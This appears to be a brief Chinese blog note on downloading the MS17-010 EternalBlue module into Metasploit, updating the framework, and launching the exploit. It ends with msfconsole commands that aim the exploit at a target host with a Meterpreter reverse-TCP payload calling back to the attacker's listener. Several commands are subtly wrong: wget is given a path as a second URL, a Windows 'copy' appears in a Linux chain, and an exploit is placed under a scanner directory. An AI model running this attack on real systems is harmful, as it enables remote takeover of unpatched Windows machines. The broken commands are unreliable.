msf手动添加漏洞脚本


msf手动添加漏洞脚本，前提链接数据库状态下(依添加ms17010为例)：


kali ： wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/


ubuntu： wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/smb/ms17_010_eternalblue.rb


然后#： msfconsole reload_all


-----------------------------------------


此外，metesploit的更新方式如下：


第一种：终端命令行下直接：msfupdate


第二种，从新下载GitHub上的新版：rm -rf msf3 && git clone https://github.com/rapid7/metasploit-framework.git;


当然模块也可以自行下载到相应的目录，如：wget https://raw.githubusercontent.com/rapid7/metasploit- framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb && copy ms17_010_eternalblue.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/


-----------------------------------------


Ms117010的利用方式之一：


msfconsole -qx "use exploit/windows/smb/ms17_010_eternalblue"


set RHOST 192.168.142.128（设置靶机）


set payload windows/x64/meterpreter/reverse_tcp （监听）


set LHOST 192.168.142.133 （设置主机ip）


exploit
